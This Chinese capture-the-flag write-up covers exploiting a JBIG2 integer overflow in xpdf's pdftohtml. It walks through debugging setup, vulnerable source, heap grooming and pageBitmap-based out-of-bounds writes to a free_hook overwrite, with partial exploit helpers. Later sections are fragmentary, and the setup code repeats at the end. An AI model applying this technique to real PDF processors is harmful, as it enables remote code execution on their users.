# Realworld CTF 之 hso-groupie Writeup

> 原文: https://www.ctfiot.com/25951.html
> ID: 25951

简介

本题的考点可能来源于Project Zero的A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution一文，这篇文章介绍了一个图片渲染库的整数溢出漏洞，以及如何通过这个漏洞来利用这个解析库原有的处理像素数据的与或非功能，构建了一个图灵完备的小型计算机，从而完成后续的漏洞利用。

但由于Linux平台相比，缓解机制并不完善，以及我们不需要对接一个sandbox escape漏洞来逃逸imessage沙箱，所以只需要简单的构建一个全加器就可以实现整个漏洞利用，体验到神奇的乐趣。
weakdog

这里是复盘 RWCTF2022 中 hso groupie 题时所写下的一些笔记，在做题的过程中，我们大量阅读了fcd14492标准文档 (https://github.com/agl/jbig2enc/blob/ea6a40a2cbf05efb00f3418f2d0ad71232565beb/fcd14492.pdf)，如果你在做题或者阅读本文的过程中感觉难以理解，请参考文档的第0章/第7章和第6章等，想必会有所收获，感谢 Riatre (https://github.com/Riatre)师傅提供的有趣题目。

一、小叙

Help check how secure our latest PaaS (Pdftohtml-as-a-Service) is!
Pick your favorite bug from this bloody list, or really, just exploit that bug so your exploit would also work on latest Poppler [1] and maybe even KItinerary.
The container image is also available on Docker Hub.
[1] Yeah, turns out propagating bug fixes between different Clone-and-Own codebases takes time :)
socat -t90 stdio tcp-connect:47.242.147.191:31337
attachment

Clone-and-Pwn, difficulty:hard

这题是 clone-and-pwn，源码没有做任何改变，就是通过查看最近提交的漏洞修复记录来发掘并利用漏洞。

二、环境搭建

1. 本地环境搭建

这一题是在 debian 下编译的，因此对于 debian 系统来说，有些系统可以直接跑 exp（例如我的 XD）。

wget https://dl.xpdfreader.com/xpdf-4.03.tar.gz
tar -zxvf xpdf-4.03.tar.gz
cd xpdf-4.03
mkdir build
cd build
cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0" ..
make -j `nproc` 

# 题目还给了一个 `GNU C Library (Debian GLIBC 2.33-2) release` 的 glibc 附件
patchelf --replace-needed libc.so.6 ${PWD}/../../libc.so.6 ./xpdf/pdftohtml

启动方式：

xpdf/pdftohtml <pdf-path> --

2. exploit 调试环境搭建

去题目环境 (https://github.com/Riatre/hso-groupie/tree/master/chall) 这里下载 dockerfile 等题目环境，之后给 dockerfile 打 patch：

--- a/Dockerfile
+++ b/Dockerfile
@@ -8,7 +8,7 @@ RUN cd /tmp/xpdf-4.03 && 
 mkdir build && 
 cd build && 
 cmake -DCMAKE_BUILD_TYPE=Release 
- -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro" .. && 
+ -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0 " .. && 
 make -j$(nproc)

 FROM debian:unstable-20211220-slim
@@ -20,6 +20,7 @@ RUN echo "deb [check-valid-until=no] http://snapshot.debian.org/archive/debian/2
 apt-get install -y fonts-arkpandora fonts-noto fonts-dejavu fonts-font-awesome fonts-lato fonts-powerline gsfonts && 
 apt-get clean && rm -rf /var/lib/apt/lists/*
 COPY --from=build /tmp/xpdf-4.03/build/xpdf/pdftohtml /usr/local/bin/
+COPY gdbserver /usr/bin/gdbserver
 RUN mkdir -p /run/secrets && echo 'rwctf{flag placeholder}' > /run/secrets/flag

-ENTRYPOINT [ "/bin/sh", "-c", "/usr/local/bin/pdftohtml "$@"", "--" ]
 No newline at end of file
+ENTRYPOINT [ "/bin/sh"]
 No newline at end of file

修改目的主要是把 gdbserver 放进镜像里，以及让入口点停在 /bin/sh，而不直接启动 pdftohtml。

这里要注意 COPY 命令的源路径，这里是直接使用相对路径。

执行 build.sh，执行完成后可以检查一下镜像

➜ chall git:(master) docker image ls 
REPOSITORY TAG IMAGE ID CREATED SIZE
hsogroupie/pdftohtml latest 042e72a0f133 45 minutes ago 946MB

启动 docker 镜像

docker run -itd -p 1234:1234 -v sakura_volume:/tmp/chall --cap-add=SYS_PTRACE --security-opt seccomp=unconfined --name hsogroupie hsogroupie/pdftohtml

该命令非常长，解构如下：

docker run --help

-i : 进入交互模式
-t : 分配一个伪shell
-d : 在后台以守护模式运行容器
-p : 宿主机端口:容器端口，将容器端口映射到宿主机端口，这里都指定1234就好了
-v : 挂载数据卷
--cap-add=SYS_PTRACE --security-opt seccomp=unconfined : Docker默认禁用PTRACE功能，需要指定这个命令
--name : 给容器声明一个名字

这里挂载数据卷需要额外说明 (参考这篇文章 https://www.cnblogs.com/edisonchou/p/docker_volumes_introduction.html)

docker volume create sakura_volume // 创建一个自定义容器卷
docker volume ls // 查看所有容器卷
docker volume inspect sakura_volume // 查看指定容器卷详情信息
...
[
 {
 "CreatedAt": "2022-02-02T01:29:55+08:00",
 "Driver": "local",
 "Labels": {},
 "Mountpoint": "/var/lib/docker/volumes/sakura_volume/_data",
 "Name": "sakura_volume",
 "Options": {},
 "Scope": "local"
 }
]

然后我们对 /var/lib/docker/volumes/sakura_volume/_data 的修改就会映射到容器的 /tmp/chall 里，传输文件就比较方便。

启动完了之后我们可以 docker ps 一下看看有没有问题

➜ chall git:(master) docker ps -a 
CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
15f265c337c0 hsogroupie/pdftohtml "/bin/sh" 34 minutes ago Up 34 minutes 0.0.0.0:1234->1234/tcp, :::1234->1234/tcp hsogroupie

生成 exp pdf，注意要对 submodule 初始化，不然没有 jbig2enc 库

git clone https://github.com/Riatre/hso-groupie.git
cd hso-groupie/exploit
git submodule update --init
cd ..
sudo cp -r exploit /var/lib/docker/volumes/sakura_volume/_data

然后我们进入 docker 容器里对应数据卷的 exploit 目录下，应该要 install 这些安装包，要是少了就自己补一下：

apt-get update
apt-get install make g++ python3 pybind11-dev python3-dev python2 python2-dev
make
...
...
root@15f265c337c0:/tmp/chall/exploit# make
g++ -O3 -std=c++20 -shared -fPIC jbig2arith.cc jbig2arith.h jbjbarith.cc jbjbarith.h -ojbjbarith.cpython-39-x86_64-linux-gnu.so -I/usr/include/python3.9 -I/usr/include/python3.9
python3 sploit.py
python2 pdf.py sploit > sploit.pdf

调试 exp

docker exec -it 15f265c337c0 bash

进入容器的 bash 环境，然后启动 gdbserver

rm -rf output && /usr/bin/gdbserver :1234 /usr/local/bin/pdftohtml /tmp/chall/exploit/sploit.pdf output

这里的 output 是随便给一个文件夹名就行了，这是 pdftohtml 必须的启动参数，它会创建这个文件夹，并输出一个结果到这个文件夹里，并且它不能是已经存在的文件夹，而 sploit.pdf 就是我们生成出来的 exp pdf 文件。

然后在宿主机也启动 gdb，然后 target remote:1234，然后随便下个断点看看效果，注意因为 docker 里的源码路径和我宿主机的源码路径并不一致，所以要用 substitute-path 做个转换，建议写个 gdb 脚本完成这个事情，后面就不用一直自己敲了。

target remote :1234
set substitute-path /tmp/xpdf-4.03/xpdf /home/sakura/ctf/hso-groupie/chall/xpdf-4.03/xpdf
b findSegment
c
...
...
 ► 0x555555675179 mov r8, qword ptr [rax]
 0x55555567517c cmp dword ptr [r8 + 8], esi
 0x555555675180 jne 0x555555675170 <0x555555675170>
 ↓
 0x555555675170 add rax, 8
 0x555555675174 cmp rax, rdx
 0x555555675177 je 0x555555675190 <0x555555675190>
───────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────
In file: /home/sakura/ctf/hso-groupie/chall/xpdf-4.03/xpdf/JBIG2Stream.cc
 4036 JBIG2Segment *JBIG2Stream::findSegment(Guint segNum) {
 4037 JBIG2Segment *seg;
 4038 int i;
 4039 
 4040 for (i = 0; i < globalSegments->getLength(); ++i) {
 ► 4041 seg = (JBIG2Segment *)globalSegments->get(i);
 4042 if (seg->getSegNum() == segNum) {
 4043 return seg;
 4044 }
 4045 }
 4046 for (i = 0; i < segments->getLength(); ++i) {
───────────────────────────────────────────[ STACK ]────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdd28 —▸ 0x555555676c72 ◂— mov r12, rax
01:0008│ 0x7fffffffdd30 ◂— 0x0
02:0010│ 0x7fffffffdd38 ◂— 0x0
03:0018│ 0x7fffffffdd40 —▸ 0x555561ec0f00 ◂— 0x200000001
04:0020│ 0x7fffffffdd48 —▸ 0x555561f40c64 ◂— 0x203a100000000
05:0028│ 0x7fffffffdd50 ◂— 0x0
... ↓ 2 skipped
─────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────
 ► f 0 0x555555675179
 f 1 0x555555676c72
 f 2 0x555555679198 JBIG2Stream::readSegments()+1032
 f 3 0x555555679473 JBIG2Stream::reset()+211
 f 4 0x55555560139a
 f 5 0x5555556494a9
 f 6 0x55555564aba0
 f 7 0x55555563c9e5

现在我们就完成了整个调试环境的搭建。

三、漏洞点

这题预期的解法是使用这篇 google project zero 的 iMessage exploit (https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html) 中的漏洞。漏洞点位于 JBIG2Stream：

void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,
 GBool lossless, Guint length,
 Guint *refSegs, Guint nRefSegs) {
 ...
 Guint numSyms;
 ...
 // get symbol dictionaries and tables
 codeTables = new GList();
 // 1. 初始时为 0
 numSyms = 0; 
 for (i = 0; i < nRefSegs; ++i) {
 if ((seg = findSegment(refSegs[i]))) {
 if (seg->getType() == jbig2SegSymbolDict) {
 // 2. 该变量与一个用户可控的值相加，会造成整数溢出
 numSyms += ((JBIG2SymbolDict *)seg)->getSize();
 } else if (seg->getType() == jbig2SegCodeTable) {
 codeTables->append(seg);
 }
 } else {
 ...
 }
 }
 ...
 // get the symbol bitmaps
 // 3. 整数溢出后，这里分配了一个较小的堆内存（指针数组）
 syms = (JBIG2Bitmap **)gmallocn(numSyms, sizeof(JBIG2Bitmap *));
 kk = 0;
 for (i = 0; i < nRefSegs; ++i) {
 if ((seg = findSegment(refSegs[i]))) {
 if (seg->getType() == jbig2SegSymbolDict) {
 symbolDict = (JBIG2SymbolDict *)seg;
 // 4. 将各个指针写入该堆内存，触发堆溢出
 for (k = 0; k < symbolDict->getSize(); ++k) {
 syms[kk++] = symbolDict->getBitmap(k);
 }
 }
 }
 }
 ...
}

由于恶意构造的 refSegs 中，一些 seg->getSize() 值很大（4GB），因此如果全部写进则肯定会触发 crash。所以在实际的漏洞利用中，会尝试先做做堆风水：
img

看图，exploit 需要将 segments GList 的后备存储，放置在刚刚创建的溢出堆块的高地址处。这样触发堆溢出时，就能在执行前几个正常 size 的写入操作时，将后备存储中的那个超大 size 所对应的 segment 指针，替换成非 JBIG2SymbolDict 类型的 segment 指针（即 JBIG2Bitmap 类型）。之后当程序检索这个 segment 指针时，就会跳过该指针的检索。

四、漏洞利用前置知识

1. JBIG2Decode

漏洞点位于 JBIG2Stream ，而 JBIG2Stream 又怎么存在于 pdf 中呢？

pdf 文件结构本质上是一个树状图，这里给出一个使用 JBIG2Stream 的 pdf 片段：

4 0 obj
<< /Filter /FlateDecode
/Length 3988
>>
stream
/* [MyStream1] */
endstream
endobj

5 0 obj
<< /DecodeParms << /JBIG2Globals 4 0 R >>
/Width 1024
/ColorSpace /DeviceGray
/Height 1
/Filter /JBIG2Decode
/Subtype /Image
/Length 418248
/Type /XObject
/BitsPerComponent 1
>>
stream
/* [MyStream2] */
endstream
endobj

pdf 文件中，4 0 obj、5 0 obj 都是表示一个特定的 pdf object。

其中，4 0 obj 标识了下面中的 MyStream1，其参数 /Filter /FlateDecode 表示该流是使用 zlib 压缩。

继续往下看可以看到： 5 0 obj 中，/DecodeParms 引用了 4 0 obj 中的 stream 流，即 MyStream1；同时参数 /Filter /JBIG2Decode 指定了接下来的流 MyStream2 使用的解码方式是 JBIG2Decode。

因此从上文可以得知，MyStream2 使用 JBIG2Decode 进行解码，其解码参数为上面引用的这个 4 0 obj，即 MyStream1 使用 FlateDecode 所解码后的流，而该参数的键为 JBIG2Globals。

而我们要做的，就是精心构建 MyStream1 和 MyStream2（这两个流都是 JBIG2Stream），使其在解析这两个 Stream 时能触发漏洞，从而 get shell。

构建好这两个流后，可以使用 jbig2enc/pdf.py 来创建出 pdf。

2. Segments 小叙

注，这一节中，每个 segment 所对应的代码最好亲自阅读一下。

当 xpdf 对 JBIG2Stream 解码时，正如上节中所示，JBIG2Decode 需要一个参数 JBIG2Globals。因此在解析时，会先解析 JBIG2Globals 的 stream，之后再解析下面的 main stream。以下代码说明了 stream 的解析过程：

void JBIG2Stream::reset()
{
 GList *t;

 segments = new GList();
 globalSegments = new GList();

 // read the globals stream
 if (globalsStream.isStream())
 {
 // 解析以 DecodeParms 传来的 global stream 流，即 FlateDecode(MyStream1)
 curStr = globalsStream.getStream();
 curStr->reset();
 // 解析时需要使用到解码器，这里是对解码器进行初始化
 arithDecoder->setStream(curStr);
 huffDecoder->setStream(curStr);
 mmrDecoder->setStream(curStr);
 // 开始读取 segments
 readSegments();
 curStr->close();
 // swap the newly read segments list into globalSegments
 t = segments;
 segments = globalSegments;
 globalSegments = t;
 }

 // read the main stream
 // 解析 main stream, 即 MySteram2
 curStr = str;
 curStr->reset();
 // 同样对解码器进行初始化
 arithDecoder->setStream(curStr);
 huffDecoder->setStream(curStr);
 mmrDecoder->setStream(curStr);
 readSegments();

 if (pageBitmap)
 {
 dataPtr = pageBitmap->getDataPtr();
 dataEnd = dataPtr + pageBitmap->getDataSize();
 }
 else
 {
 dataPtr = dataEnd = NULL;
 }
}

这里我们可以了解到，JBIG2Stream 是由多个 Segment 组成的，Segment 种类较多。这里我们只关注几个有用到的 Segment。

a. EOFSeg

该 Segment 的解析标志了完成了全部 segment 的读取，没有其他用途。

b. SymbolDictSeg

SymbolDict 主要存放了一个指向 Bitmap 的指针数组。Bitmap 可以用于存放数据，在实际漏洞利用中将起到类似内存的作用。

对于每个 symbol dict 中的 Bitmap，规范中将其称为一个 instance。

解析 SymbolDictSeg 时，将会从 stream 中读取并创建出每一个 Bitmap。

GBool JBIG2Stream::readSymbolDictSeg(Guint segNum, Guint length,
 Guint *refSegs, Guint nRefSegs)
{
 [...]
 // 创建 bitmaps 数组
 // get the input symbol bitmaps
 bitmaps = (JBIG2Bitmap **)gmallocn(numInputSyms + numNewSyms,
 sizeof(JBIG2Bitmap *));
 for (i = 0; i < numInputSyms + numNewSyms; ++i)
 {
 bitmaps[i] = NULL;
 }
 k = 0;
 inputSymbolDict = NULL;
 for (i = 0; i < nRefSegs; ++i)
 {
 if ((seg = findSegment(refSegs[i])))
 {
 if (seg->getType() == jbig2SegSymbolDict)
 {
 inputSymbolDict = (JBIG2SymbolDict *)seg;
 for (j = 0; j < inputSymbolDict->getSize(); ++j)
 {
 bitmaps[k++] = inputSymbolDict->getBitmap(j);
 }
 }
 }
 }
 [...]
 // 开始尝试从外部 JBIG2Stream 流中读取 bitmap
 symHeight = 0;
 i = 0;
 while (i < numNewSyms)
 {
 // read the height class delta height
 if (huff) [...]
 else
 {
 arithDecoder->decodeInt(&dh, iadhStats);
 } 
 [...]
 symHeight += dh;
 symWidth = 0;
 totalWidth = 0;
 j = i;

 [...]

 // read the symbols in this height class
 while (1)
 {
 // read the delta width
 if (huff) [...]
 else
 {
 if (!arithDecoder->decodeInt(&dw, iadwStats))
 {
 break;
 }
 }
 [...]

 // using a collective bitmap, so don't read a bitmap here
 if (huff && !refAgg) [...]
 else if (refAgg) [...]
 else
 {
 // 从外部流中读取 bitmap 并将其保存进数组中
 bitmaps[numInputSyms + i] =
 readGenericBitmap(gFalse, symWidth, symHeight,
 sdTemplate, gFalse, gFalse, NULL,
 sdATX, sdATY, 0);
 }

 ++i;
 }

 // read the collective bitmap
 if (huff && !refAgg) [...]
 }
 // 创建了一个 symbolDict 结构体
 // create the symbol dict object
 symbolDict = new JBIG2SymbolDict(segNum, numExSyms);

 // 将上面创建的 bitmaps 数组复制进 symbolDict 结构体中
 // exported symbol list
 i = j = 0;
 ex = gFalse;
 prevRun = 1;
 while (i < numInputSyms + numNewSyms)
 {
 if (huff)
 [...]
 else
 {
 arithDecoder->decodeInt(&run, iaexStats);
 }
 [...]
 if (ex)
 {
 for (cnt = 0; cnt < run; ++cnt)
 {
 // 将上面创建的 bitmaps 对等深拷贝进 symbolDict 中
 symbolDict->setBitmap(j++, bitmaps[i++]->copy());
 }
 }
 else
 {
 i += run;
 }
 ex = !ex;
 prevRun = run;
 }
 [...] // 释放 bitmaps 数组
 // store the new symbol dict
 segments->append(symbolDict);
 [...]
}

c. PageInfoSeg

对于每个 Page 来说，需要有一个 Bitmap 来表示当前页面渲染的数据。而在解析 PageInfoSeg 时，程序会创建一个流内全局 Bitmap：pageBitmap。

void JBIG2Stream::readPageInfoSeg(Guint length)
{
 Guint xRes, yRes, flags, striping;

 if (!readULong(&pageW) || !readULong(&pageH) ||
 !readULong(&xRes) || !readULong(&yRes) ||
 !readUByte(&flags) || !readUWord(&striping))
 {
 goto eofError;
 }
 [...]
 // 创建流内全局字段 pageBitmap
 pageBitmap = new JBIG2Bitmap(0, pageW, curPageH);

 // default pixel value
 [...]

 return;

eofError:
 error(errSyntaxError, getPos(), "Unexpected EOF in JBIG2 stream");
}

需要注意的是，pageBitmap 很关键，它表示了一个 Page 的 bitmap。我们将使用堆溢出来覆写 pageBitmap 的 Width 和 Height，进而达到越界读写的目的。

同时 PageInfoSeg 还可用于绕过一个 sanity check，下文中会提到。

d. GenericRegionSeg

GenericRegionSeg 的解析将会从流中读取一个 Bitmap，并与当前的 pageBitmap 的特定区域进行运算：

需要注意的是，JBIG2Globals Stream 中的 Segment 不允许引用任何 Segment，因此 GenericRegionSeg 不能存放在 JBIG2Globals 流中。

void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,
 GBool lossless, Guint length)
{
 [...]
 // read the bitmap
 bitmap = readGenericBitmap(mmr, w, h, templ, tpgdOn, gFalse,
 NULL, atx, aty, mmr ? length - 18 : 0);

 // combine the region bitmap into the page bitmap
 if (imm)
 {
 if (pageH == 0xffffffff && y + h > curPageH)
 {
 pageBitmap->expand(y + h, pageDefPixel);
 }
 pageBitmap->combine(bitmap, x, y, extCombOp);
 delete bitmap;

 // store the region bitmap
 }
 [...]
}

其中，从流中读取 Bitmap 的操作位于 readGenericBitmap 函数中，读取的操作需要使用到编码器。

而与 pageBitmap 的运算主要是使用 JBIG2Bitmap::combine 方法，该方法中有五种运算方式，分别是 与、或、异或和替换：

switch (combOp)
{
 case 0: // or
 dest |= src1 & m2;
 break;
 case 1: // and
 dest &= src1 | m1;
 break;
 case 2: // xor
 dest ^= src1 & m2;
 break;
 case 3: // xnor
 dest ^= (src1 ^ 0xff) & m2;
 break;
 case 4: // replace
 dest = (src1 & m2) | (dest & m1);
 break;
}

我们可以将外部的立即数，通过利用该段的解析过程，将其传入 pageBitmap 中等待进一步的运算。

e. GenericRefinementRegionSeg

GenericRefinementRegionSeg 的解析过程，组合起来可以对 pageBitmap 上的部分数据进行位运算。我们可以利用这里的位运算来构建加法器：

void JBIG2Stream::readGenericRefinementRegionSeg(Guint segNum, GBool imm,
 GBool lossless, Guint length,
 Guint *refSegs,
 Guint nRefSegs)
{
 [...]
 if (nRefSegs == 1)
 {
 if (!(seg = findSegment(refSegs[0])) ||
 seg->getType() != jbig2SegBitmap)
 {
 error(errSyntaxError, getPos(),
 "Bad bitmap reference in JBIG2 generic refinement segment");
 return;
 }
 refBitmap = (JBIG2Bitmap *)seg;
 }
 else
 {
 refBitmap = pageBitmap->getSlice(x, y, w, h);
 }
 [...]
 // read
 bitmap = readGenericRefinementRegion(w, h, templ, tpgrOn,
 refBitmap, 0, 0, atx, aty);

 // combine the region bitmap into the page bitmap
 if (imm)
 {
 pageBitmap->combine(bitmap, x, y, extCombOp);
 delete bitmap;

 // store the region bitmap
 }
 else
 {
 bitmap->setSegNum(segNum);
 segments->append(bitmap);
 }
 [...]
}

当 GenericRefinementRegionSeg 不引用任何段时，变量 nRefSegs 为 0，此时 refBitmap 为 pageBitmap 上指定 x、y、w、h 属性的一块数据空间。

由于函数 readGenericRefinementRegion 只会受到 refBitmap 的影响，因此我们可以认定传出的bitmap 变量等价于 pageBitmap 上特定区域的数据。

接下来，若我们指定 imm 为 false，那么这块等价于 pageBitmap 上特定区域的数据，将被存储进 segments 数组中。

若下一次解析 GenericRefinementRegionSeg  时引用了第一步创建的段，那么此时 refBitmap 为第一步创建的 Bitmap。这样当 imm 为 true 时，第一步创建的 Bitmap 将会和 pageBitmap 上指定的位置进行 combine 操作，即位运算。

由于第一步创建的 bitmap 是和 pageBitmap 相关，因此整个过程就等价于

+----------------------> x-axis
|
| .(2)
|
| .(1)
|
V 
y-axis

从 pageBitmap 上特定位置1取下一块数据，并保存至 segments 上

从 segments 上取下这块数据，并将其与 pageBitmap 上特定位置2进行位运算。

JArithmeticDecoder

JBIG2HuffmanDecoder

JBIG2MMRDecoder

ArithEncoder：调用 jbig2enc 对 bitmap 进行编码的类

Bitmap：待被编码的 bitmap 数据

ArithEncoder::Proc：ArithEncoder 编码器的状态枚举

hso-groupie/exploit/jbig2arith.[cc,h]

hso-groupie/exploit/jbjbarith.[cc,h]

让 pdf 在解析 TextRegionSeg 时，其创建的 syms 指针数组位于 undersized syms buffer 处

让内含存放超多指针的 JBIG2SymbolDict 结构体的 segment 放置在 segments GList backing buffer 处

这里，我们打算让 JBIG2SymbolDict 结构体存放至 global segment 中，因为 SymbolDictSegment 不依赖与任何的 Segments，但是后续的 TextRegionSegment 会依赖这些 SymbolDictSegment。

让 pageBitmap 结构体占据图中 JBIG2Bitmap 那块内存，并让其 data 占据图中上面 bitmap backing buffer 那块内存。

通读代码，我们可以得知绝大多数 segments 在解析时，都可以让其 bitmap 与 pageBitmap 进行运算，并将结果保存在 pageBitmap 上。因此让 pageBitmap 拥有越界读写的能力是最好的选择。

让 pageBitmap backing store 占据 size=16 的 Glist 堆空洞

让解析 TextRegion 时创建的 syms 指针数组占据 size=32 的 Glist 堆空洞

其内部创建的 syms 大小必须是 syms_size（这个值上面已经说明了）

向堆块写入的数据大小为 size_to_overflow 个字节，即实际写 size_to_overflow // 8 个指针

将偏移量为 0字节 的位置上的八字节(即 0-7 这8个字节)，与 偏移量为 8字节 的位置上的 八字节（即 8-15 这8字节），进行一次一一对应的 and 运算。

将运算结果放置在偏移量为 0字节 的位置上的八字节(即 0-7 这8个字节)上。

rebase_variable_q：将 pageBitmap 中一维偏移为 addr_page_offset 处的 8 字节数据，复制进堆风水中最后一步所创建的带有 16 个 Bitmap 的 SymbolDict 中，第 idx 个 JBIG2Bitmap 的 data 字段上：

注意，是直接将值覆盖在 JBIG2Bitmap 的 data 字段上，而不是写进 data 指针所指向的内存上。

def rebase_variable_q(idx, addr_page_offset):
 mov_q_q(
 variable_bitmap_offset + idx * ptmalloc_chunk_size(0x20) + 0x18,
 addr_page_offset,
 )

load_variable：读取最后一个 Symbol Dict 中，第 idx 个 JBIG2Bitmap backing store 里的（即 data 指针解引用后的内存上） 的第一个 8 字节数据，至 pageBitmap 中一维偏移为 to_page_offset 处的 8 字节内存位置。

def load_variable(to_page_offset, idx):
 to_page_offset *= 8
 x, y = to_page_offset % 2 ** 27, to_page_offset // 2 ** 27
 page0.append(
 TextRegion(
 233,
 x=x,
 y=y,
 w=64,
 h=1,
 imm=True,
 instances=[idx],
 ref_symbol_cnt=16,
 ref_segs=[105],
 )
 )

imm 必须为 true，这样才能触发 delete 操作。

创建的 GenericRegionSeg，其二维偏移 xy 映射至一维偏移后的偏移量，不能小于 64（即 8 字节）

这是因为代码中会先执行 pageBitmap->combine 再执行 delete bitmap 操作。此时的 pageBitmap->data 为 free hook address，如果执行 combine 时修改了pageBitmap->data 最低的8个字节，那么 free 时就无法调用到 libc_system，因为保存在 free_hook 上面的 libc_system 地址被破坏了。

hso-groupie – Riatre github

A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution – Google Project Zero

一个简单PDF文件的结构分析 – CSDN

PDF 文件格式 基本结构 – CSDN

https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf – Adobe

重点在 7.4.7 JBIG2Decode Filter 这节。

Coding of Still Pictures : JBIG & JPEG – JBIG Committee


```
Help check how secure our latest PaaS (Pdftohtml-as-a-Service) is!
Pick your favorite bug from this bloody list, or really, just exploit that bug so your exploit would also work on latest Poppler [1] and maybe even KItinerary.
The container image is also available on Docker Hub.
[1] Yeah, turns out propagating bug fixes between different Clone-and-Own codebases takes time :)
socat -t90 stdio tcp-connect:47.242.147.191:31337
attachment

Clone-and-Pwn, difficulty:hard
```



```
wget https://dl.xpdfreader.com/xpdf-4.03.tar.gz
tar -zxvf xpdf-4.03.tar.gz
cd xpdf-4.03
mkdir build
cd build
cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0" ..
make -j `nproc` 

# 题目还给了一个 `GNU C Library (Debian GLIBC 2.33-2) release` 的 glibc 附件
patchelf --replace-needed libc.so.6 ${PWD}/../../libc.so.6 ./xpdf/pdftohtml
```



```
xpdf/pdftohtml <pdf-path> --
```



```
--- a/Dockerfile
+++ b/Dockerfile
@@ -8,7 +8,7 @@ RUN cd /tmp/xpdf-4.03 && 
 mkdir build && 
 cd build && 
 cmake -DCMAKE_BUILD_TYPE=Release 
- -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro" .. && 
+ -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0 " .. && 
 make -j$(nproc)

 FROM debian:unstable-20211220-slim
@@ -20,6 +20,7 @@ RUN echo "deb [check-valid-until=no] http://snapshot.debian.org/archive/debian/2
 apt-get install -y fonts-arkpandora fonts-noto fonts-dejavu fonts-font-awesome fonts-lato fonts-powerline gsfonts && 
 apt-get clean && rm -rf /var/lib/apt/lists/*
 COPY --from=build /tmp/xpdf-4.03/build/xpdf/pdftohtml /usr/local/bin/
+COPY gdbserver /usr/bin/gdbserver
 RUN mkdir -p /run/secrets && echo 'rwctf{flag placeholder}' > /run/secrets/flag

-ENTRYPOINT [ "/bin/sh", "-c", "/usr/local/bin/pdftohtml "$@"", "--" ]
 No newline at end of file
+ENTRYPOINT [ "/bin/sh"]
 No newline at end of file
```



```
➜ chall git:(master) docker image ls 
REPOSITORY TAG IMAGE ID CREATED SIZE
hsogroupie/pdftohtml latest 042e72a0f133 45 minutes ago 946MB
```



```
docker run -itd -p 1234:1234 -v sakura_volume:/tmp/chall --cap-add=SYS_PTRACE --security-opt seccomp=unconfined --name hsogroupie hsogroupie/pdftohtml
```



```
docker run --help

-i : 进入交互模式
-t : 分配一个伪shell
-d : 在后台以守护模式运行容器
-p : 宿主机端口:容器端口，将容器端口映射到宿主机端口，这里都指定1234就好了
-v : 挂载数据卷
--cap-add=SYS_PTRACE --security-opt seccomp=unconfined : Docker默认禁用PTRACE功能，需要指定这个命令
--name : 给容器声明一个名字
```



```
docker volume create sakura_volume // 创建一个自定义容器卷
docker volume ls // 查看所有容器卷
docker volume inspect sakura_volume // 查看指定容器卷详情信息
...
[
 {
 "CreatedAt": "2022-02-02T01:29:55+08:00",
 "Driver": "local",
 "Labels": {},
 "Mountpoint": "/var/lib/docker/volumes/sakura_volume/_data",
 "Name": "sakura_volume",
 "Options": {},
 "Scope": "local"
 }
]
```



```
➜ chall git:(master) docker ps -a 
CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
15f265c337c0 hsogroupie/pdftohtml "/bin/sh" 34 minutes ago Up 34 minutes 0.0.0.0:1234->1234/tcp, :::1234->1234/tcp hsogroupie
```



```
git clone https://github.com/Riatre/hso-groupie.git
cd hso-groupie/exploit
git submodule update --init
cd ..
sudo cp -r exploit /var/lib/docker/volumes/sakura_volume/_data
```



```
apt-get update
apt-get install make g++ python3 pybind11-dev python3-dev python2 python2-dev
make
...
...
root@15f265c337c0:/tmp/chall/exploit# make
g++ -O3 -std=c++20 -shared -fPIC jbig2arith.cc jbig2arith.h jbjbarith.cc jbjbarith.h -ojbjbarith.cpython-39-x86_64-linux-gnu.so -I/usr/include/python3.9 -I/usr/include/python3.9
python3 sploit.py
python2 pdf.py sploit > sploit.pdf
```



```
docker exec -it 15f265c337c0 bash
```



```
rm -rf output && /usr/bin/gdbserver :1234 /usr/local/bin/pdftohtml /tmp/chall/exploit/sploit.pdf output
```



```
target remote :1234
set substitute-path /tmp/xpdf-4.03/xpdf /home/sakura/ctf/hso-groupie/chall/xpdf-4.03/xpdf
b findSegment
c
...
...
 ► 0x555555675179 mov r8, qword ptr [rax]
 0x55555567517c cmp dword ptr [r8 + 8], esi
 0x555555675180 jne 0x555555675170 <0x555555675170>
 ↓
 0x555555675170 add rax, 8
 0x555555675174 cmp rax, rdx
 0x555555675177 je 0x555555675190 <0x555555675190>
───────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────
In file: /home/sakura/ctf/hso-groupie/chall/xpdf-4.03/xpdf/JBIG2Stream.cc
 4036 JBIG2Segment *JBIG2Stream::findSegment(Guint segNum) {
 4037 JBIG2Segment *seg;
 4038 int i;
 4039 
 4040 for (i = 0; i < globalSegments->getLength(); ++i) {
 ► 4041 seg = (JBIG2Segment *)globalSegments->get(i);
 4042 if (seg->getSegNum() == segNum) {
 4043 return seg;
 4044 }
 4045 }
 4046 for (i = 0; i < segments->getLength(); ++i) {
───────────────────────────────────────────[ STACK ]────────────────────────────────────────────
